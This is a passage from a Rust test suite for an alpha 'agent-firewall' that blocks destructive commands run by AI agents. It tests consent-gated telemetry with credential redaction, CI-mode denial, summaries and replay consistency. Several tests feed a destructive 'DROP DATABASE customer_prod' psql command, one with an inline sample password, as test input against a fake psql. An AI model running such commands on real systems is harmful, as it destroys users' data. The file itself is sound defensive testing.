            "psql --set=db_password=hunter2 -c 'DROP DATABASE customer_prod'",
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");
    assert_eq!(output.status.code(), Some(3));

    // Without consent, no sample and no outbox.
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "sample".into(),
        trace.display().to_string(),
        "--config".into(),
        config.display().to_string(),
        "--outbox".into(),
        outbox.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("telemetry is off"), "{out}");
    assert!(!outbox.exists(), "no consent, no outbox");

    // With consent, one sample that a text editor can read.
    grant_all(&config);
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "sample".into(),
        trace.display().to_string(),
        "--config".into(),
        config.display().to_string(),
        "--outbox".into(),
        outbox.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("1 sample(s) packaged"), "{out}");

    let sample_path = outbox.join(
        std::fs::read_dir(&outbox)
            .expect("the outbox")
            .next()
            .expect("one sample")
            .expect("an entry")
            .file_name(),
    );
    let text = std::fs::read_to_string(&sample_path).expect("the sample file");
    assert!(
        text.contains("database.destructive.drop-database"),
        "the sample names the rule that fired:\n{text}"
    );
    assert!(
        !text.contains("hunter2"),
        "the credential must never reach the sample:\n{text}"
    );
    assert!(
        text.contains("db_password=<redacted>"),
        "the command line keeps its shape with the value redacted:\n{text}"
    );
    assert!(
        !text.contains(repo_root().display().to_string().trim_matches('/')),
        "the machine's paths must not travel"
    );

    // The inspector prints the sample and its summary.
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "inspect".into(),
        sample_path.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("# sample of session s-"), "{out}");
    assert!(out.contains("DROP DATABASE customer_prod"), "{out}");

    // The status counts what waits in the outbox.
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "status".into(),
        "--config".into(),
        config.display().to_string(),
        "--outbox".into(),
        outbox.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("(1 sample(s))"), "{out}");

    // Destruction empties the outbox.
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "destroy".into(),
        "--all".into(),
        "--outbox".into(),
        outbox.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("destroyed 1 sample(s)"), "{out}");
    assert!(
        std::fs::read_dir(&outbox).expect("the outbox").count() == 0,
        "the outbox is empty after destruction"
    );
}

#[test]
fn a_quiet_trace_makes_no_sample() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("trace.jsonl");
    let config = dir.path().join("telemetry.json");
    let outbox = dir.path().join("outbox");
    let (code, _out, err) = firewall(&[
        "run",
        "--approve",
        "deny",
        "--trace",
        trace.to_str().unwrap(),
        "--",
        "/bin/echo",
        "hello",
    ]);
    assert_eq!(code, 0, "{err}");

    grant_all(&config);
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "sample".into(),
        trace.display().to_string(),
        "--config".into(),
        config.display().to_string(),
        "--outbox".into(),
        outbox.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(
        out.contains("no suspicious event"),
        "a session without a question makes no sample:\n{out}"
    );
    assert!(!outbox.exists(), "nothing was written");
}

#[test]
fn run_with_telemetry_packages_samples_without_a_trace_file() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let marker = dir.path().join("marker");
    write_fake_psql(dir.path(), &marker);
    let config = dir.path().join("telemetry.json");
    let outbox = dir.path().join("outbox");

    // Without consent the session says so and writes nothing.
    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "deny",
            "--telemetry",
            "--telemetry-config",
            config.to_str().unwrap(),
            "--telemetry-outbox",
            outbox.to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            "psql -c 'DROP DATABASE customer_prod'",
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    assert_eq!(output.status.code(), Some(3));
    assert!(
        stderr.contains("telemetry is off, so no sample was written"),
        "the session must say that consent is missing:\n{stderr}"
    );
    assert!(!outbox.exists(), "no consent, no outbox");

    // With consent the same session packages its own sample, with no
    // `--trace` at all.
    grant_all(&config);
    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "deny",
            "--telemetry",
            "--telemetry-config",
            config.to_str().unwrap(),
            "--telemetry-outbox",
            outbox.to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            "psql -c 'DROP DATABASE customer_prod'",
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    assert_eq!(output.status.code(), Some(3));
    assert!(
        stderr.contains("1 sample(s) written"),
        "the session must package its sample:\n{stderr}"
    );
    assert!(
        stderr.contains("nothing is sent anywhere"),
        "the session must say where the sample stays:\n{stderr}"
    );
    let count = std::fs::read_dir(&outbox).expect("the outbox").count();
    assert_eq!(count, 1, "one sample for one denied session");
}

#[test]
fn every_session_prints_the_alpha_banner() {
    let (code, out, err) = firewall(&["run", "--approve", "deny", "--", "/bin/echo", "hello"]);
    assert_eq!(code, 0);
    assert!(
        err.contains("not a production security boundary"),
        "the disclosure must precede every session:\n{err}"
    );
    assert!(
        !out.contains("agent-firewall"),
        "the banner stays on standard error, so the output of the agent stays clean:\n{out}"
    );
}

#[test]
fn doctor_carries_the_alpha_disclosure_and_the_telemetry_state() {
    let (code, out, err) = firewall(&["doctor"]);
    assert_eq!(code, 0, "{err}");
    assert!(
        out.contains("not a production security boundary"),
        "doctor must carry the disclosure:\n{out}"
    );
    assert!(
        out.contains("telemetry: off"),
        "doctor must report the default consent state:\n{out}"
    );
}

// ---------------------------------------------------------------------------
// Headless CI mode: `run --ci` and the session summary
// ---------------------------------------------------------------------------

/// Runs a `--ci` session of the fake client and returns the exit code, the
/// output, the errors and the paths of the summary and the trace.
///
/// This is a live-session test: it launches the monitor, so it needs a
/// machine that permits ptrace sessions (yama ptrace_scope below 3). On a
/// machine that cannot launch one the run fails with the error exit code 2
/// and the assertions below fail honestly.
fn ci_session(dir: &Path, extra: &[&str]) -> (i32, String, String, PathBuf, PathBuf) {
    let marker = dir.join("marker");
    write_fake_psql(dir, &marker);
    let summary = dir.join("summary.json");
    let trace = dir.join("trace.jsonl");
    let output = Command::new(binary())
        .args([
            "run",
            "--ci",
            "--summary",
            summary.to_str().unwrap(),
            "--trace",
            trace.to_str().unwrap(),
        ])
        .args(extra)
        .args([
            "--",
            "/bin/sh",
            "-c",
            "psql -c 'DROP DATABASE customer_prod'",
        ])
        .env("PATH", path_with(dir))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");
    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
        summary,
        trace,
    )
}

/// Returns the parsed session summary of a path.
fn read_summary(path: &Path) -> serde_json::Value {
    let text = std::fs::read_to_string(path)
        .unwrap_or_else(|error| panic!("the summary must exist at {}: {error}", path.display()));
    serde_json::from_str(&text)
        .unwrap_or_else(|error| panic!("the summary must be valid JSON: {error}\n{text}"))
}

#[test]
fn a_ci_session_is_denied_with_the_contract_code_and_no_terminal() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let (code, _out, err, _summary, _trace) = ci_session(dir.path(), &[]);

    // The exit-code contract of `run --help`: the firewall stopped an
    // action, so the session returns 3.
    assert_eq!(
        code, 3,
        "a denied ci session must return the blocked exit code:\n{err}"
    );
    // Deterministic headless posture: the session says so, and it never
    // writes a prompt — the prompt text is the only shape a question takes.
    assert!(
        err.contains("ci mode: every question resolves to deny"),
        "the ci mode must announce its posture:\n{err}"
    );
    assert!(
        !err.contains("answer [a/s/d/t]"),
        "a ci session must never prompt, also not when a terminal exists:\n{err}"
    );
    // The alpha banner stays in ci mode: a CI guard is still alpha.
    assert!(
        err.contains("not a production security boundary"),
        "the disclosure must precede a ci session too:\n{err}"
    );
    assert!(
        !dir.path().join("marker").exists(),
        "the denied statement must not run"
    );
}

#[test]
fn the_ci_summary_is_valid_and_every_deny_maps_to_a_rule() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let (code, _out, _err, summary_path, _trace) = ci_session(dir.path(), &[]);
    assert_eq!(code, 3);

    let summary = read_summary(&summary_path);
    assert_eq!(summary["schema_version"], 1, "the schema version is fixed");
    assert_eq!(summary["exit_code"], 3, "the summary carries the exit code");
    assert_eq!(summary["session"]["ci"], true);
    assert!(
        summary["session"]["command"].is_array(),
        "the summary names the session command"
    );

    let counts = &summary["counts"];
    assert!(
        counts["denied"].as_u64().expect("denied is a number") >= 1,
        "the denied action is counted:\n{summary}"
    );
    assert!(
        counts["questions"].as_u64().expect("questions is a number") >= 1,
        "the question an interactive session would have asked is counted:\n{summary}"
    );

    // Every deny maps to a rule identifier of the built-in pack: the rule
    // is the unit a CI job gates on, so no deny may be anonymous.
    let decisions = summary["decisions"]
        .as_array()
        .expect("decisions is an array");
    assert!(
        !decisions.is_empty(),
        "a denied session must record its decisions"
    );
    let denied: Vec<&str> = decisions
        .iter()
        .filter(|one| one["resolved"] == "deny" || one["resolved"] == "terminate-session")
        .map(|one| one["rule_id"].as_str().expect("rule_id is text"))
        .collect();
    assert!(
        !denied.is_empty(),
        "at least one decision must be a deny:\n{summary}"
    );
    let (_, list_out, _list_err) = firewall(&["policy", "list"]);
    for rule_id in &denied {
        assert!(
            rule_id.contains('.'),
            "a rule identifier is namespaced, but this one is not: {rule_id}"
        );
        assert!(
            list_out.contains(rule_id),
            "every denied rule must exist in the built-in pack: {rule_id}"
        );
    }

    // The evidence line and the provenance chain are part of every decision.
    for one in decisions {
        assert!(
            one["evidence"]
                .as_str()
                .expect("evidence is text")
                .contains("DROP DATABASE"),
            "the evidence names the action:\n{one}"
        );
        assert!(
            one["provenance"]
                .as_array()
                .expect("provenance is an array")
                .len()
                >= 2,
            "the provenance chain names the ancestry and the actor:\n{one}"
        );
    }
}

#[test]
fn a_clean_ci_session_exits_zero_with_no_denials() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let summary = dir.path().join("summary.json");
    let (code, out, err) = firewall(&[
        "run",
        "--ci",
        "--summary",
        summary.to_str().unwrap(),
        "--",
        "/bin/echo",
        "hello",
    ]);
    assert_eq!(code, 0, "a clean session stays clean under --ci:\n{err}");
    assert!(out.contains("hello"), "output was:\n{out}");

    let parsed = read_summary(&summary);
    assert_eq!(parsed["exit_code"], 0);
    assert_eq!(parsed["counts"]["denied"], 0, "no deny happened:\n{parsed}");
    assert_eq!(parsed["counts"]["questions"], 0, "no rule asked:\n{parsed}");
    assert_eq!(
        parsed["decisions"].as_array().map(Vec::len),
        Some(0),
        "a clean session decides nothing:\n{parsed}"
    );
}

#[test]
fn the_ci_summary_matches_the_replay_of_the_same_trace() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let (code, _out, _err, summary_path, trace) = ci_session(dir.path(), &[]);
    assert_eq!(code, 3);

    let summary = read_summary(&summary_path);
    let (replay_code, replay_out, replay_err) =
        firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(replay_code, 0, "{replay_err}");
    let hits: Vec<serde_json::Value> =
        serde_json::from_str(&replay_out).expect("the replay prints a JSON array");

    // Replay consistency: every decision the summary claims, the replay of
    // the same trace under the built-in pack finds again, with the same
    // decision label. A summary that claimed more than the record proves
    // would be a summary nobody can trust.
    for one in summary["decisions"].as_array().expect("decisions") {
        let rule_id = one["rule_id"].as_str().expect("rule_id");
        let decision = one["decision"].as_str().expect("decision");
        let found = hits
            .iter()
            .any(|hit| hit["rule_id"] == rule_id && hit["decision"].as_str() == Some(decision));
        assert!(
            found,
            "the replay must confirm {rule_id} ({decision}) that the summary claims:\n{replay_out}"
        );
    }
    assert!(
        hits.iter()
            .any(|hit| hit["rule_id"] == "database.destructive.drop-database"),
        "the replay finds the denied rule:\n{replay_out}"
    );
}

#[test]
fn ci_cannot_be_weakened_by_an_approval_flag() {
    // The two flags refuse to combine, so a job's posture is one line that
    // no copy-pasted `--approve` can weaken by accident.
    let (code, _out, err) = firewall(&[
        "run",
        "--ci",
        "--approve",
        "allow",
        "--",
        "/bin/echo",
        "hello",
    ]);
    assert_ne!(code, 0, "the combination must be refused");
    assert!(
        err.contains("--approve"),
        "the error must name the conflict:\n{err}"
    );
}

#[test]
fn the_run_help_names_every_exit_code() {
    let (code, out, err) = firewall(&["run", "--help"]);
    assert_eq!(code, 0, "{err}");
    for code in ["0", "3", "2", "128+N"] {
        assert!(
            out.contains(code),
            "the exit-code table must name {code}:\n{out}"
        );
    }
    assert!(
        out.contains("Exit codes:"),
        "the table has a heading:\n{out}"
    );
}
